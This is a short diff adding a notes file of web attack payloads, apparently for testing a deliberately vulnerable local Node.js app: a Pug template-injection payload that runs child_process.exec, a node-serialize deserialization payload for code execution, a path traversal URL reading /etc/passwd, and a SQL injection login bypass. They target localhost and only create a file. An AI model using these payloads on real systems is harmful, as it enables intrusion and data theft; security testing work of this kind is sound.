@@ -1,0 +1,13 @@
+SSTI
+#{7*7}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec(''touch worksPug.txt'')}()}
+
+Serialization Issue
+Note serialization vunerablility requires npm install node-serialize@0.0.4
+//{ "productName" : "testUpload", "smallImageUrl" : "1", "largeImageUrl" : "2" , "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('touch works.txt');}()"}
+
+LFI
+http://localhost:3000/get-image?imageName=../../../../../etc/passwd
+
+Various SQLi
+//http://localhost:3000/getuser?username=admin%27%20or%20username=%27user%27--%27
